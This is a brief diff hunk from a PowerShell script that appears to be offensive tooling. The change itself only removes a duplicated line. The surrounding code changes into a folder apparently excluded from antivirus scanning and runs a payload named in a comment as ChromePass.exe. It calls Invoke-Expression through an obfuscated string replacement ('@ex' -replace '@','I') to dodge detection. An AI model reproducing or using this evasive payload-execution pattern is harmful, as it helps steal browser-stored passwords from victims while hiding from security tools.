@@ -613,7 +613,6 @@ If($Action -iMatch "(add|exec)")
             $ExecMe = ".\" + "$PayloadName" -Join ''
          }
 
-         $ExecMe = ".\" + "$PayloadName" -Join ''
          cd $Exclude                        # TMP
          $ExecMe|&('@ex' -replace '@','I')  # ChromePass.exe
          cd $StartPath                      # $pwd
